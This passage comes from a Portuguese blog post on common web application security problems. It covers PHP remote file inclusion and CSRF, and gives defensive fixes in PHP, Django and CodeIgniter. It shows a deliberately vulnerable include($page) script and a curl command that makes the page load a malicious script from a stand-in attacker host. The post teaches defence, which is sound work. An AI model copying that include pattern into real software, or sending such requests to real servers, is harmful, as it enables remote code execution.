data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token shell-comment comment\"># php-injection.php</span>\n\n<span class=\"token variable\">$page</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'page'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'topo.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'menu.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<p>Logo:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ curl http://localhost/php-injection.php?page=novidades.php</code></pre></div>\n<p>No caso acima, estamos incluindo o arquivo <code class=\"language-text\">novidades.php</code> e\nautomaticamente exibindo o seu conteúdo. Podemos navegar por outras\náreas do <em>website</em>, por exemplo, <code class=\"language-text\">page=contato.php</code> ou\n<code class=\"language-text\">page=institucional.php</code>. Mas, e se informarmos\n<code class=\"language-text\">page=php-injection.php</code>?</p>\n<p>Caímos num <em>looping</em> infinito!</p>\n<p>E, infelizmente, esse é o menor dos nossos problemas. O <em>PHP</em>, quando\nconfigurado com a opção <code class=\"language-text\">allow_url_include</code> como <code class=\"language-text\">TRUE</code>, é capaz\nde importar arquivos de outros <em>hosts</em>. Logo, o atacante pode ter um\n<em>script</em> malicioso hospedado em seu servidor, e passar o caminho dele\npara a aplicação acima. A aplicação incluirá e interpretará o <em>PHP</em> que\nestiver neste <em>script</em>:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ curl http://localhost/php-injection.php?page=http://sitedoatacante.com.br/meu-script-malicioso.php.txt</code></pre></div>\n<p>Pronto! Temos código <em>PHP</em> de outra pessoa executando em nosso servidor.</p>\n<p>Para resolver este problema, configure a opção <code class=\"language-text\">allow_url_include</code>\nem seu <code class=\"language-text\">php.ini</code> como <code class=\"language-text\">FALSE</code>. Outro passo importante é, sempre que\nfor importar algum arquivo que dependa de informações vindas do usuário,\nverifique o conteúdo desta informação. Exemplo:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token keyword\">switch</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">case</span> <span class=\"token single-quoted-string string\">'novidades'</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'novidades.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">case</span> <span class=\"token single-quoted-string string\">'contato'</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'contato.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">case</span> <span class=\"token single-quoted-string string\">'institucional'</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'institucional.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">default</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'404.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Este ataque não é tão incomum quanto deveria. Fique atento.</p>\n<h2>CSRF – Cross-site request forgery (não confie na requisição)</h2>\n<p>O <strong><em>Cross-site request forgery</em></strong> ou <strong>falsificação de solicitação\nentre sites</strong>, é uma forma de ataque que mescla a <a href=\"http://pt.wikipedia.org/wiki/Engenharia_social_(seguran%C3%A7a_da_informa%C3%A7%C3%A3o)\" title=\"Leia mais sobre Engenharia Social no Wikipedia\">Engenharia Social</a>\ncom vulnerabilidades das aplicações <em>web</em>.</p>\n<p>O ataque pode ser feito da seguinte forma:</p>\n<ul>\n<li>Você recebe um <em>e-mail</em> com uma <em>URL</em> oculta (geralmente algum\n<em>e-mail</em> do tipo “Veja as minhas fotos” (: )</li>\n<li>Esta <em>URL</em> executa alguma ação em uma aplicação que você esteja\nautenticado no momento (por exemplo, o <em>Facebook</em>)</li>\n<li>Esta ação pode, tanto dar poderes de acesso ao atacante, quanto\nalterar ou remover os seus dados permanentemente</li>\n</ul>\n<p>Note que o primeiro item pode ser substituído por algum <strong>conteúdo\n<em>link</em> injetado via <em>XSS</em></strong> em algum fórum ou área de comentários de um\n<em>blog</em>.</p>\n<p>Embora o exemplo acima não represente tanta ameaça, existem vários tipos\nde aplicações que este tipo de técnica pode afetar. O exemplo do banco,\nencontrado no <em>site</em> <a href=\"https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)\" title=\"Leia mais sobre CSRF\"><em>The Open Web Application Security Project</em></a>, é\num excelente exempo de ataque <em>CSRF</em>.</p>\n<p>Para prevenir este tipo de problema, podemos fazer um controle através\nde <a href=\"/2012/04/05/entendendo-os-cookies-e-sessoes.html\" title=\"Entendendo o Cookies e Sessões\">sessões</a> e transmitir um <em>token</em> que identifique que a requisição\nfoi de fato feita pelo usuário. <em>Kinn Coelho Julião</em> escreveu <a href=\"http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/\" title=\"Protegendo seus sistemas contra ataques CSRF\">um <em>post</em> interessante para o <em>PHP-SP</em></a>,\ndemonstrando como prevenir ataques <em>CSRF</em> através de <em>token</em>.</p>\n<p>De fato, tanto o <em>Django</em> quanto o <em>Codeigniter</em> utilizam essa tática\npara prevenir ataques <em>CSRF</em>. No <em>Django</em>, com o <em>middleware</em>\n<code class=\"language-text\">django.middleware.csrf.CsrfViewMiddleware</code>, basta adicionar a chamada\nda <em>templatetag</em> ao formulário:</p>\n<div class=\"gatsby-highlight\" data-language=\"django-html\"><pre class=\"language-django-html\"><code class=\"language-django-html\">&lt;form method=&quot;post&quot; action=&quot;.&quot;&gt;\n    {% csrf_token %}\n    ...\n&lt;/form&gt;</code></pre></div>\n<p>A <em>templatetag</em> acima criará um campo oculto no formulário chamado\n<code class=\"language-text\">csrfmiddlewaretoken</code>. Quando um <em>POST</em> for realizado para a <em>view</em> em\nquestão, caso o conteúdo de <code class=\"language-text\">csrfmiddlewaretoken</code> vindo do formulário\nnão “bata” com o conteúdo armazenado em sessão, o <em>Django</em> entende que\naquela requisição não foi feita de maneira “natural” (ou seja, acessando\no formulário e submetendo-o). Logo, fica subentendido que aquela\nrequisição veio de outra origem, e o <em>framework</em> não executa as\ninstruções da <em>view</em> (retornando um código 403).</p>\n<p>No <em>Codeigniter</em>, com a opção <code class=\"language-text\">$config[&#39;csrf_protection’]</code> como\n<code class=\"language-text\">TRUE</code> no arquivo <code class=\"language-text\">application/config/config.php</code>, o <em>framework</em>\nadicionará automaticamente o campo de proteção <em>CSRF</em> na abertura do\nformulário:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">form_open</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span></code></pre></div>\n<h2>Considerações finais</h2>\n<p>Ficou um <em>post</em> grande, mas acredito que consegui cobrir os problemas de\nsegurança mais conhecidos em aplicações <em>Web</em>. Como é possível notar,\nsão vulnerabilidades que são facilmente contornáveis, mas que podem\ntrazer sérios problemas para você e seus usuários caso a sua aplicação\nnão esteja segura o bastante.</p>\n<p>Reforço: Se você tiver a oportunidade de utilizar um <em>framework</em>,\nutilize! Eles possuem soluções prontas e bem testadas para prevenir os\nproblemas citados acima, e outros tantos que surgem a cada dia na\n<em>internet</em>.</p>\n<h2>Referências</h2>\n<ul>\n<li><a href=\"http://www.dinke.net/blog/en/2011/10/20/validating-an-integer-with-php/\" title=\"As diferentes formas de validarmos um valor inteiro em PHP\"><em>Caugh in a Web: Validating an integer in PHP</em></a></li>\n<li><a href=\"http://codeigniter.com/user_guide/database/active_record.html\" title=\"Saiba como fazer consultas eficientes ao banco de dados com o Codeigniter\"><em>Codeigniter User Guide: Active Record Class</em></a></li>\n<li><a href=\"http://codeigniter.com/user_guide/general/security.html\" title=\"Veja as dicas de segurança dadas pelo time do Codeigniter\"><em>Codeigniter User Guide: Security</em></a></li>\n<li><a href=\"https://docs.djangoproject.com/en/1.4/topics/db/queries/\" title=\"Saiba como construir modelos e como consultá-los através do ORM do Django\"><em>Django Documentation: Making queries</em></a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/topics/security/\" title=\"Veja dicas preciosas de segurança utilizando o Django\"><em>Django Documentation: Security in Django</em></a></li>\n<li><a href=\"http://www.invasao.com.br/2008/03/18/php-injection-o-fim-das-duvidas/\" title=\"Entenda como funciona um ataque via PHP Injection\">Invasão.com.br: <em>PHP Injection</em> – O fim das dúvidas</a></li>\n<li><a href=\"http://www.php.net/manual/pt_BR/book.mysqli.php\" title=\"Conheça a mysqli direto da documentação do PHP\"><em>PHP Documentation: MySQL Melhorada</em></a></li>\n<li><a href=\"http://php.net/pdo\" title=\"Conheça uma das formas mais eficientes de fazer consultas a bancos de dados no PHP\"><em>PHP Documentation: PDO – PHP Data Objects</em></a></li>\n<li><a href=\"http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/\" title=\"Aprenda como utilizar tolkens para prevenir ataques CSRF\"><em>PHP SP</em>: Protegendo o seu sistema contra ataques <em>CSRF</em></a></li>\n<li><a href=\"http://www.sitepoint.com/php-security-blunders/\" title=\"Excelentes dicas de segurança para quem programa em PHP\"><em>Site Point: Top 7 PHP Security Blunders Article</em></a></li>\n<li><a href=\"http://stackoverflow.com/questions/60174/best-way-to-stop-sql-injection-in-php\" title=\"Excelente thread no Stack Overflow, sobre SQL injection\"><em>Stack Overflow: Best way to stop SQL injection in PHP</em></a></li>\n<li><a href=\"https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)\" title=\"Um bom artigo sobre o conceito do CSRF\"><em>The Open Web Application Security Project: Cross-Site Request Forgery</em></a></li>\n<li><a href=\"http://en.wikipedia.org/wiki/Code_injection\" title=\"Leia mais sobre as formas de injeção de código no Wikipedia\"><em>Wikipedia: Code Injection</em></a></li>\n<li><a href=\"http://pt.wikipedia.org/wiki/Inje%C3%A7%C3%A3o_de_SQL\" title=\"Leia mais sobre SQL Injection no Wikipedia\"><em>Wikipedia</em>: Injeção de <em>SQL</em></a></li>\n</ul>","excerpt":"Seria perfeito se o mundo fosse feito apenas de pessoas\nbem-intencionadas. Acontece que é mais fácil os alienígenas exterminarem\na raça…","frontmatter":{"date":"2012-04-15T18:03:48.000Z","title":"Problemas comuns de segurança em aplicações Web","tags":["desenvolvimento-web","segurança","xss","csrf","sql-injection","php-injection","django","php","codeigniter"],"thumbnail":{"childImageSharp":{"fixed":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAUABQDASIAAhEBAxEB/8QAGQABAAMBAQAAAAAAAAAAAAAAAAMEBQEG/8QAFQEBAQAAAAAAAAAAAAAAAAAAAgP/2gAMAwEAAhADEAAAAZMe3nufoHTnm0wuUVH/xAAbEAADAAMBAQAAAAAAAAAAAAABAgMEEyIRM//aAAgBAQABBQItOEpMN1ogtfX6iqw2KFr1i4/2r03/xAAZEQEBAAMBAAAAAAAAAAAAAAABAAIRITL/2gAIAQMBAT8BA1Nj5h5f/8QAGREBAAIDAAAAAAAAAAAAAAAAAQACEBEy/9oACAECAQE/AVYblusf/8QAHhAAAgEEAwEAAAAAAAAAAAAAAAECERIhMSJBUWH/2gAIAQEABj8C5SllaqLk4xO9ek3u6OPjO7iKlJVSLntCKn//xAAdEAEAAgICAwAAAAAAAAAAAAABABEhMUFRgaGx/9oACAEBAAE/IdimAZS9PNUw6+xEkpUv0RAXkwGqgnoIwAgYKjrz/Jst1xP/2gAMAwEAAgADAAAAENvovv/EABkRAAIDAQAAAAAAAAAAAAAAAAABESExgf/aAAgBAwEBPxCwGU0zXo6B/8QAFxEBAQEBAAAAAAAAAAAAAAAAEQABEP/aAAgBAgEBPxBBaHAy/8QAHBABAAMAAwEBAAAAAAAAAAAAAQARITFBYXHB/9oACAEBAAE/EAo8w6rOQvCJVVLoL5nsGzsd3b7GSRt1QWV1Z3LCL4Aw5V9ieakb0mCAUFVtfsZpVhy+oABBC3Fz/9k=","width":180,"height":180,"src":"/static/1cd4b4725839683e40ab3a81772685f8/a8ad2/security.jpg","srcSet":"/static/1cd4b4725839683e40ab3a81772685f8/a8ad2/security.jpg 1x"}},"publicURL":"/static/1cd4b4725839683e40ab3a81772685f8/security.jpg"}},"fields":{"readingTime":{"minutes":16.33},"slug":"/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html"}},"site":{"siteMetadata":{"author":{"name":"Klaus Peter Laube","gravatar":"https://en.gravatar.com/userimage/12163112/d3ae0c6239980b01ff1f1730b65c2ebe.jpg"},"siteUrl":"https://klauslaube.com.br"}}},"pageContext":{"slug":"/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html"}}}